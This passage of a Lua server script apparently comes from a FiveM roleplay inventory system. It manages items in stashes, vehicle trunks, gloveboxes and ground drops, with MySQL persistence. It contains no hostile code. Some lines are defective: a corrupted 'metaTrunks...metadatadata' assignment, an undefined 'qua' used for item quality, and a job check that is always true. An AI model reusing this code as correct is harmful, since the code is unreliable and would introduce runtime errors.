				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Stashes[stashId].items[otherslot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = itemInfo['created'],
				metadata = itemInfo['metadata'] ,
				slot = otherslot,
				decay = decay,
			}
		else
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Stashes[stashId].items[slot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = itemInfo['created'],
				metadata = itemInfo['metadata'] ,
				slot = slot,
				decay = decay,
			}
		end
	end
end

local function RemoveFromStash(stashId, slot, itemName, amount)
	amount = tonumber(amount) or 1
	if Stashes[stashId].items[slot] and Stashes[stashId].items[slot].name == itemName then
		if Stashes[stashId].items[slot].amount > amount then
            if Stashes[stashId].items[slot].decay then
				Stashes[stashId].items[slot].metadata = exports['aj-inventory-helper']:Decode(Stashes[stashId].items[slot].metadata.data)
                local index = #Stashes[stashId].items[slot].metadata
                local amountMeta = math.max(index - amount, 1)
                local newData = {}
                if amountMeta > 0 then
                    table.move(Stashes[stashId].items[slot].metadata, 1, amountMeta, 1, newData)
                end
                Stashes[stashId].items[slot].created = newData[#newData].created
                Stashes[stashId].items[slot].info.quality = newData[#newData].quality
                Stashes[stashId].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Stashes[stashId].items[slot].amount = Stashes[stashId].items[slot].amount - amount
		else
			Stashes[stashId].items[slot] = nil
		end
	else
		Stashes[stashId].items[slot] = nil
		if Stashes[stashId].items == nil then
			Stashes[stashId].items[slot] = nil
		end
	end
end

local function GetOwnedVehicleItems(plate)
	local items = {}
	local result = MySQL.scalar.await('SELECT items FROM trunkitems WHERE plate = ?', {plate})
	if not result then return items end

	local trunkItems = json.decode(result)
	if not trunkItems then return items end

	for _, item in pairs(trunkItems) do
		local itemInfo = AJFW.Shared.Items[item.name:lower()]
		if itemInfo then
			items[item.slot] = {
				name = itemInfo["name"],
				amount = tonumber(item.amount),
				info = item.info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = item.created or os.time(),
				metadata = item.metadata or {
					count = 1,
					data = "eJyLrlZKLkpNLElNUbIyNjc0NLYwsbS01FEqLE3MySypVLIyNDCojQUA4ZoLY"
				},
				slot = item.slot,
				decay = item.decay,
			}
		end
	end
	return items
end

local function SaveOwnedVehicleItems(plate, items)
	if Trunks[plate].label == "Trunk-None" or not items then return end

	for _, item in pairs(items) do
		item.description = nil
	end

	MySQL.insert('INSERT INTO trunkitems (plate, items) VALUES (:plate, :items) ON DUPLICATE KEY UPDATE items = :items', {
		['plate'] = plate,
		['items'] = json.encode(items)
	})

	Trunks[plate].isOpen = false
end

local function AddToTrunk(plate, slot, otherslot, itemName, amount, info, created, metadata, decay)
	amount = tonumber(amount) or 1
	local ItemData = AJFW.Shared.Items[itemName]
	local itemInfo = AJFW.Shared.Items[itemName:lower()]
	local time = os.time()
	if not metadata then
		local amount = itemInfo.decay and amount or 1
		itemInfo['metadata'] = {}
		for i = 1, amount do
			itemInfo['metadata'][#itemInfo['metadata']+1] = {
				created = time,
				quality =  100
			}
		end
        if itemInfo.decay then
            decay = itemInfo.decay
        end
	else
		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
		itemInfo['metadata'] = metadata
	end
	if not created then
		itemInfo['created'] = time
	else
		itemInfo['created'] = created
	end
	info = info or {}
	itemInfo['created'] = itemInfo['metadata'][#itemInfo['metadata']].created or time
	local ogQuality = info.quality
	
	info.quality = itemInfo['metadata'][#itemInfo['metadata']].quality or 100
	if itemInfo['type'] == 'weapon' then
		info.serie = info.serie or tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
		info.quality = ogQuality or 100
	end
	if not ItemData.unique then
		if Trunks[plate].items[slot] and Trunks[plate].items[slot].name == itemName then
            if decay then
                local newData = {}
				Trunks[plate].items[slot].metadata = exports['aj-inventory-helper']:Decode(Trunks[plate].items[slot].metadata.data)
                local existingMetadata = Trunks[plate].items[slot].metadata
                local upcomingMetadata = itemInfo['metadata']
                local amountMeta = math.min(#upcomingMetadata, amount)
                
                -- Copy existing metadata
                for i = 1, #existingMetadata do
                    newData[i] = existingMetadata[i]
                end
                
                -- Move upcoming metadata
                local newMetadataStartIndex = #existingMetadata + 1
                table.move(upcomingMetadata, #upcomingMetadata - amountMeta + 1, #upcomingMetadata, newMetadataStartIndex, newData)
                
                -- Update player data
                Trunks[plate].items[slot].created = newData[#newData].created
                Trunks[plate].items[slot].info.quality = newData[#newData].quality
                Trunks[plate].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Trunks[plate].items[slot].amount = Trunks[plate].items[slot].amount + amount
		else
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Trunks[plate].items[slot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = created,
				metadata = itemInfo['metadata'] ,
				slot = slot,
				decay = decay,
			}
		end
	else
		if Trunks[plate].items[slot] and Trunks[plate].items[slot].name == itemName then
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Trunks[plate].items[otherslot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = created,
				metadata = itemInfo['metadata'] ,
				slot = otherslot,
				decay = decay,
			}
		else
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Trunks[plate].items[slot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = created,
				metadata = itemInfo['metadata'] ,
				slot = slot,
				decay = decay,
			}
		end
	end
end

local function RemoveFromTrunk(plate, slot, itemName, amount)
	amount = tonumber(amount) or 1
	if Trunks[plate].items[slot] and Trunks[plate].items[slot].name == itemName then
		if Trunks[plate].items[slot].amount > amount then
            if Trunks[plate].items[slot].decay then
				metaTrunks[plate].items[slot].metadatadata = exports['aj-inventory-helper']:Decode(Trunks[plate].items[slot].metadata.data)
                local index = #Trunks[plate].items[slot].metadata
                local amountMeta = math.max(index - amount, 1)
                local newData = {}
                if amountMeta > 0 then
                    table.move(Trunks[plate].items[slot].metadata, 1, amountMeta, 1, newData)
                end
                Trunks[plate].items[slot].created = newData[#newData].created
                Trunks[plate].items[slot].info.quality = newData[#newData].quality
                Trunks[plate].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
            Trunks[plate].items[slot].amount = Trunks[plate].items[slot].amount - amount
		else
			Trunks[plate].items[slot] = nil
		end
	else
		Trunks[plate].items[slot] = nil
		if Trunks[plate].items == nil then
			Trunks[plate].items[slot] = nil
		end
	end
end

local function GetOwnedVehicleGloveboxItems(plate)
	local items = {}
	local result = MySQL.scalar.await('SELECT items FROM gloveboxitems WHERE plate = ?', {plate})
	if not result then return items end

	local gloveboxItems = json.decode(result)
	if not gloveboxItems then return items end

	for _, item in pairs(gloveboxItems) do
		local itemInfo = AJFW.Shared.Items[item.name:lower()]
		if itemInfo then
			items[item.slot] = {
				name = itemInfo["name"],
				amount = tonumber(item.amount),
				info = item.info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = item.created or os.time(),
				metadata = item.metadata or {
					count = 1,
					data = "eJyLrlZKLkpNLElNUbIyNjc0NLYwsbS01FEqLE3MySypVLIyNDCojQUA4ZoLY"
				},
				slot = item.slot,
				decay = item.decay,
			}
		end
	end
	return items
end

local function SaveOwnedGloveboxItems(plate, items)
	if Gloveboxes[plate].label == "Glovebox-None" or not items then return end

	for _, item in pairs(items) do
		item.description = nil
	end

	MySQL.insert('INSERT INTO gloveboxitems (plate, items) VALUES (:plate, :items) ON DUPLICATE KEY UPDATE items = :items', {
		['plate'] = plate,
		['items'] = json.encode(items)
	})

	Gloveboxes[plate].isOpen = false
end

local function AddToGlovebox(plate, slot, otherslot, itemName, amount, info, created, metadata, decay)
	amount = tonumber(amount) or 1
	local ItemData = AJFW.Shared.Items[itemName]
	local itemInfo = AJFW.Shared.Items[itemName:lower()]
	local time = os.time()
	if not metadata then
		local amount = itemInfo.decay and amount or 1
		itemInfo['metadata'] = {}
		for i = 1, amount do
			itemInfo['metadata'][#itemInfo['metadata']+1] = {
				created = time,
				quality =  qua
			}
		end
        if itemInfo.decay then
            decay = itemInfo.decay
        end
	else
		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
		itemInfo['metadata'] = metadata
	end
	if not created then
		itemInfo['created'] = time
	else
		itemInfo['created'] = created
	end
	info = info or {}
	itemInfo['created'] = itemInfo['metadata'][#itemInfo['metadata']].created or time
	local ogQuality = info.quality
	
	info.quality = itemInfo['metadata'][#itemInfo['metadata']].quality or 100
	if itemInfo['type'] == 'weapon' then
		info.serie = info.serie or tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
		info.quality = ogQuality or 100
	end
	if not ItemData.unique then
		if Gloveboxes[plate].items[slot] and Gloveboxes[plate].items[slot].name == itemName then
            if decay then
                local newData = {}
				Gloveboxes[plate].items[slot].metadata = exports['aj-inventory-helper']:Decode(Gloveboxes[plate].items[slot].metadata.data)
                local existingMetadata = Gloveboxes[plate].items[slot].metadata
                local upcomingMetadata = itemInfo['metadata']
                local amountMeta = math.min(#upcomingMetadata, amount)
                
                -- Copy existing metadata
                for i = 1, #existingMetadata do
                    newData[i] = existingMetadata[i]
                end
                
                -- Move upcoming metadata
                local newMetadataStartIndex = #existingMetadata + 1
                table.move(upcomingMetadata, #upcomingMetadata - amountMeta + 1, #upcomingMetadata, newMetadataStartIndex, newData)
                
                -- Update player data
                Gloveboxes[plate].items[slot].created = newData[#newData].created
                Gloveboxes[plate].items[slot].info.quality = newData[#newData].quality
                Gloveboxes[plate].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Gloveboxes[plate].items[slot].amount = Gloveboxes[plate].items[slot].amount + amount
		else
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Gloveboxes[plate].items[slot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = created,
				metadata = itemInfo['metadata'] ,
				slot = slot,
				decay = decay,
			}
		end
	else
		if Gloveboxes[plate].items[slot] and Gloveboxes[plate].items[slot].name == itemName then
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Gloveboxes[plate].items[otherslot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = created,
				metadata = itemInfo['metadata'] ,
				slot = otherslot,
				decay = decay,
			}
		else
			if #itemInfo['metadata'] == amount then
				itemInfo['metadata'] = {
					count = #itemInfo['metadata'],
					data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				itemInfo['metadata'] = {
					count = #adata,
					data = exports['aj-inventory-helper']:Encode(adata)
				}
			end
			Gloveboxes[plate].items[slot] = {
				name = itemInfo["name"],
				amount = amount,
				info = info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = created,
				metadata = #itemInfo['metadata'] == amount and itemInfo['metadata'] or RemoveTable(itemInfo['metadata'], amount, decay),
				slot = slot,
				decay = decay,
			}
		end
	end
end

local function RemoveFromGlovebox(plate, slot, itemName, amount)
	amount = tonumber(amount) or 1
	if Gloveboxes[plate].items[slot] and Gloveboxes[plate].items[slot].name == itemName then
		if Gloveboxes[plate].items[slot].amount > amount then
            if Gloveboxes[plate].items[slot].decay then
				Gloveboxes[plate].items[slot].metadata = exports['aj-inventory-helper']:Decode(Gloveboxes[plate].items[slot].metadata.data)
                local index = #Gloveboxes[plate].items[slot].metadata
                local amountMeta = math.max(index - amount, 1)
                local newData = {}
                if amountMeta > 0 then
                    table.move(Gloveboxes[plate].items[slot].metadata, 1, amountMeta, 1, newData)
                end
                Gloveboxes[plate].items[slot].created = newData[#newData].created
                Gloveboxes[plate].items[slot].info.quality = newData[#newData].quality
                Gloveboxes[plate].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Gloveboxes[plate].items[slot].amount = Gloveboxes[plate].items[slot].amount - amount
		else
			Gloveboxes[plate].items[slot] = nil
		end
	else
		Gloveboxes[plate].items[slot] = nil
		if Gloveboxes[plate].items == nil then
			Gloveboxes[plate].items[slot] = nil
		end
	end
end

local function AddToDrop(dropId, slot, itemName, amount, info, created, metadata, decay)
	amount = tonumber(amount) or 1
	local itemInfo = AJFW.Shared.Items[itemName:lower()]
	local time = os.time()
	if not metadata then
		local amount = itemInfo.decay and amount or 1
		itemInfo['metadata'] = {}
		for i = 1, amount do
			itemInfo['metadata'][#itemInfo['metadata']+1] = {
				created = time,
				quality =  qua
			}
		end
        if itemInfo.decay then
            decay = itemInfo.decay
        end
	else
		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
		itemInfo['metadata'] = metadata
	end
	if not created then
		itemInfo['created'] = time
	else
		itemInfo['created'] = created
	end
	info = info or {}
	itemInfo['created'] = itemInfo['metadata'][#itemInfo['metadata']].created or time
	local ogQuality = info.quality
	
	info.quality = itemInfo['metadata'][#itemInfo['metadata']].quality or 100
	if itemInfo['type'] == 'weapon' then
		info.serie = info.serie or tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
		info.quality = ogQuality or 100
	end
	Drops[dropId].createdTime = os.time()
	if Drops[dropId].items[slot] and Drops[dropId].items[slot].name == itemName then
        if decay then
            local newData = {}
			Drops[dropId].items[slot].metadata = exports['aj-inventory-helper']:Decode(Drops[dropId].items[slot].metadata.data)
            local existingMetadata = Drops[dropId].items[slot].metadata
            local upcomingMetadata = itemInfo['metadata']
            local amountMeta = math.min(#upcomingMetadata, amount)
            
            -- Copy existing metadata
            for i = 1, #existingMetadata do
                newData[i] = existingMetadata[i]
            end
            
            -- Move upcoming metadata
            local newMetadataStartIndex = #existingMetadata + 1
            table.move(upcomingMetadata, #upcomingMetadata - amountMeta + 1, #upcomingMetadata, newMetadataStartIndex, newData)
            
            -- Update player data
            Drops[dropId].items[slot].created = newData[#newData].created
            Drops[dropId].items[slot].info.quality = newData[#newData].quality
            Drops[dropId].items[slot].metadata = {
				count = #newData,
				data = exports['aj-inventory-helper']:Encode(newData)
			}
        end
		Drops[dropId].items[slot].amount = Drops[dropId].items[slot].amount + amount
	else
		local itemInfo = AJFW.Shared.Items[itemName:lower()]
		if #itemInfo['metadata'] == amount then
			itemInfo['metadata'] = {
				count = #itemInfo['metadata'],
				data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
			}
		else
			local adata = RemoveTable(itemInfo['metadata'], amount, decay)
			itemInfo['metadata'] = {
				count = #adata,
				data = exports['aj-inventory-helper']:Encode(adata)
			}
		end
		Drops[dropId].items[slot] = {
			name = itemInfo["name"],
			amount = amount,
			info = info or "",
			label = itemInfo["label"],
			description = itemInfo["description"] or "",
			weight = itemInfo["weight"],
			type = itemInfo["type"],
			unique = itemInfo["unique"],
			useable = itemInfo["useable"],
			image = itemInfo["image"],
			created = created,
			metadata = itemInfo['metadata'] ,
			slot = slot,
			decay = decay,
			id = dropId,
		}
	end
end

local function RemoveFromDrop(dropId, slot, itemName, amount)
	amount = tonumber(amount) or 1
	Drops[dropId].createdTime = os.time()
	if Drops[dropId].items[slot] and Drops[dropId].items[slot].name == itemName then
		if Drops[dropId].items[slot].amount > amount then
            if Drops[dropId].items[slot].decay then
				Drops[dropId].items[slot].metadata = exports['aj-inventory-helper']:Decode(Drops[dropId].items[slot].metadata.data)
                local index = #Drops[dropId].items[slot].metadata
                local amountMeta = math.max(index - amount, 1)
                local newData = {}
                if amountMeta > 0 then
                    table.move(Drops[dropId].items[slot].metadata, 1, amountMeta, 1, newData)
                end
                Drops[dropId].items[slot].created = newData[#newData].created
                Drops[dropId].items[slot].info.quality = newData[#newData].quality
                Drops[dropId].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Drops[dropId].items[slot].amount = Drops[dropId].items[slot].amount - amount
		else
			Drops[dropId].items[slot] = nil
		end
	else
		Drops[dropId].items[slot] = nil
		if Drops[dropId].items == nil then
			Drops[dropId].items[slot] = nil
		end
	end
end

local function CreateDropId()
	if Drops then
		local id = math.random(10000, 99999)
		local dropid = id
		while Drops[dropid] do
			id = math.random(10000, 99999)
			dropid = id
		end
		return dropid
	else
		local id = math.random(10000, 99999)
		local dropid = id
		return dropid
	end
end

local function CreateNewDrop(source, fromSlot, toSlot, itemAmount, created, metadata, decay)
	itemAmount = tonumber(itemAmount) or 1
	local Player = AJFW.Functions.GetPlayer(source)
	local itemData = GetItemBySlot(source, fromSlot)

	if not itemData then return end

	local itemInfo = AJFW.Shared.Items[itemData.name:lower()]
	local time = os.time()
	if not metadata then
		local amount = itemInfo.decay and itemAmount or 1
		itemInfo['metadata'] = {}
		for i = 1, amount do
			itemInfo['metadata'][#itemInfo['metadata']+1] = {
				created = time,
				quality =  qua
			}
		end
        if itemInfo.decay then
            decay = itemInfo.decay
        end
	else
		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
		itemInfo['metadata'] = metadata
	end
	if not created then
		itemInfo['created'] = time
	else
		itemInfo['created'] = created
	end
	info = info or {}
	itemInfo['created'] = itemInfo['metadata'][#itemInfo['metadata']].created or time
	local ogQuality = info.quality
	
	info.quality = itemInfo['metadata'][#itemInfo['metadata']].quality or 100
	if itemInfo['type'] == 'weapon' then
		info.serie = info.serie or tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
		info.quality = ogQuality or 100
	end
	local coords = GetEntityCoords(GetPlayerPed(source))
	if RemoveItem(source, itemData.name, itemAmount, itemData.slot, true) then
		TriggerClientEvent("inventory:client:CheckWeapon", source, itemData.name)
		local itemInfo = AJFW.Shared.Items[itemData.name:lower()]
		if #itemInfo['metadata'] == itemAmount then
			itemInfo['metadata'] = {
				count = #itemInfo['metadata'],
				data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
			}
		else
			local adata = RemoveTable(itemInfo['metadata'], itemAmount, decay)
			itemInfo['metadata'] = {
				count = #adata,
				data = exports['aj-inventory-helper']:Encode(adata)
			}
		end
		local dropId = CreateDropId()
		Drops[dropId] = {}
		Drops[dropId].coords = coords
		Drops[dropId].createdTime = os.time()

		Drops[dropId].items = {}

		Drops[dropId].items[toSlot] = {
			name = itemInfo["name"],
			amount = itemAmount,
			info = itemData.info or "",
			label = itemInfo["label"],
			description = itemInfo["description"] or "",
			weight = itemInfo["weight"],
			type = itemInfo["type"],
			unique = itemInfo["unique"],
			useable = itemInfo["useable"],
			image = itemInfo["image"],
			created = itemInfo['created'],
			metadata = itemInfo['metadata'] ,
			slot = toSlot,
			decay = decay,
			id = dropId,
		}
		TriggerEvent("aj-log:server:CreateLog", "drop", "New Item Drop", "red", "**".. GetPlayerName(source) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..source.."*) dropped new item; name: **"..itemData.name.."**, amount: **" .. itemAmount .. "**")
		TriggerClientEvent("inventory:client:DropItemAnim", source)
		TriggerClientEvent("inventory:client:AddDropItem", -1, dropId, source, coords)
		if itemData.name:lower() == "radio" then
			TriggerClientEvent('Radio.Set', source, false)
		end
	else
		AJFW.Functions.Notify(source, Lang:t("notify.missitem"), "error")
	end
end

local function OpenInventory(name, id, other, origin)
	local src = origin
	if InventoryOpen[src] then
		return AJFW.Functions.Notify(src, 'Player ID:'..InventoryOpen[src]..' Have hands in your pocket', 'error')
	end
	local ply = Player(src)
    local Player = AJFW.Functions.GetPlayer(src)
	if ply.state.inv_busy then
		return AJFW.Functions.Notify(src, Lang:t("notify.noaccess"), 'error')
	end
	if name and id then
		local secondInv = {}
		if name == "stash" then
			if Stashes[id] then
				if Stashes[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Stashes[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Stashes[id].isOpen, name, id, Stashes[id].label)
					else
						Stashes[id].isOpen = false
					end
				end
			end
			local maxweight = 1000000
			local slots = 50
			if other then
				maxweight = other.maxweight or 1000000
				slots = other.slots or 50
			end
			secondInv.name = "stash-"..id
			secondInv.label = "Stash-"..id
			secondInv.maxweight = maxweight
			secondInv.inventory = {}
			secondInv.slots = slots
			if Stashes[id] and Stashes[id].isOpen then
				secondInv.name = "none-inv"
				secondInv.label = "Stash-None"
				secondInv.maxweight = 1000000
				secondInv.inventory = {}
				secondInv.slots = 0
			else
				local stashItems = GetStashItems(id)
				if next(stashItems) then
					secondInv.inventory = stashItems
					Stashes[id] = {}
					Stashes[id].items = stashItems
					Stashes[id].isOpen = src
					Stashes[id].label = secondInv.label
				else
					Stashes[id] = {}
					Stashes[id].items = {}
					Stashes[id].isOpen = src
					Stashes[id].label = secondInv.label
				end
			end
		elseif name == "trunk" then
			if Trunks[id] then
				if Trunks[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Trunks[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Trunks[id].isOpen, name, id, Trunks[id].label)
					else
						Trunks[id].isOpen = false
					end
				end
			end
			secondInv.name = "trunk-"..id
			secondInv.label = "Trunk-"..id
			secondInv.maxweight = other.maxweight or 60000
			secondInv.inventory = {}
			secondInv.slots = other.slots or 50
			if (Trunks[id] and Trunks[id].isOpen) or (AJFW.Shared.SplitStr(id, "PLZI")[2] and (Player.PlayerData.job.type ~= "leo" or Player.PlayerData.job.type ~= "leo")) then
				secondInv.name = "none-inv"
				secondInv.label = "Trunk-None"
				secondInv.maxweight = other.maxweight or 60000
				secondInv.inventory = {}
				secondInv.slots = 0
			else
				if id then
					local ownedItems = GetOwnedVehicleItems(id)
					if Trunks[id] and not Trunks[id].isOpen then
						secondInv.inventory = Trunks[id].items
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					elseif IsVehicleOwned(id) and next(ownedItems) then
						secondInv.inventory = ownedItems
						Trunks[id] = {}
						Trunks[id].items = ownedItems
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					elseif Trunks[id] and not Trunks[id].isOpen then
						secondInv.inventory = Trunks[id].items
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					else
						Trunks[id] = {}
						Trunks[id].items = {}
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					end
				end
			end
		elseif name == "glovebox" then
			if Gloveboxes[id] then
				if Gloveboxes[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Gloveboxes[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Gloveboxes[id].isOpen, name, id, Gloveboxes[id].label)
					else
						Gloveboxes[id].isOpen = false
					end
				end
			end
			secondInv.name = "glovebox-"..id
			secondInv.label = "Glovebox-"..id
			secondInv.maxweight = 10000
			secondInv.inventory = {}
			secondInv.slots = 5
			if Gloveboxes[id] and Gloveboxes[id].isOpen then
				secondInv.name = "none-inv"
				secondInv.label = "Glovebox-None"
				secondInv.maxweight = 10000
				secondInv.inventory = {}
				secondInv.slots = 0
			else
				local ownedItems = GetOwnedVehicleGloveboxItems(id)
				if Gloveboxes[id] and not Gloveboxes[id].isOpen then
					secondInv.inventory = Gloveboxes[id].items
					Gloveboxes[id].isOpen = src
					Gloveboxes[id].label = secondInv.label
				elseif IsVehicleOwned(id) and next(ownedItems) then
					secondInv.inventory = ownedItems
					Gloveboxes[id] = {}
					Gloveboxes[id].items = ownedItems
					Gloveboxes[id].isOpen = src
					Gloveboxes[id].label = secondInv.label
				else
					Gloveboxes[id] = {}
					Gloveboxes[id].items = {}
					Gloveboxes[id].isOpen = src
					Gloveboxes[id].label = secondInv.label
				end
			end
		elseif name == "shop" then
			secondInv.name = "itemshop-"..id
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = SetupShopItems(other.items)
			ShopItems[id] = {}
			ShopItems[id].items = other.items
			secondInv.slots = #other.items
		elseif name == "traphouse" then
			secondInv.name = "traphouse-"..id
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = other.items
			secondInv.slots = other.slots
		elseif name == "crafting" then
			secondInv.name = "crafting"
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = other.items
			secondInv.slots = #other.items
		elseif name == "attachment_crafting" then
			secondInv.name = "attachment_crafting"
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = other.items
			secondInv.slots = #other.items
		elseif name == "otherplayer" then
			if not InventoryOpen[tonumber(id)] then
				InventoryOpen[tonumber(id)] = src
				TriggerClientEvent("aj-inventory:client:closeinv", tonumber(id))
			end
			if InventoryOpen[tonumber(id)] then
				return AJFW.Functions.Notify(src, 'Player ID:'..InventoryOpen[tonumber(id)]..' Already have hands in same pocket', 'error')
			end
			local OtherPlayer = AJFW.Functions.GetPlayer(tonumber(id))
			if OtherPlayer then
				secondInv.name = "otherplayer-"..id
				secondInv.label = "Player-"..id
				secondInv.maxweight = Config.MaxInventoryWeight
				secondInv.inventory = OtherPlayer.PlayerData.items
				if (Player.PlayerData.job.name == "police" or Player.PlayerData.job.type == "leo") and Player.PlayerData.job.onduty then
					secondInv.slots = Config.MaxInventorySlots
				else
					secondInv.slots = Config.MaxInventorySlots - 1
				end
				Wait(250)
			end
		else
			if Drops[id] then
				if Drops[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Drops[id].isOpen)
					if Target then
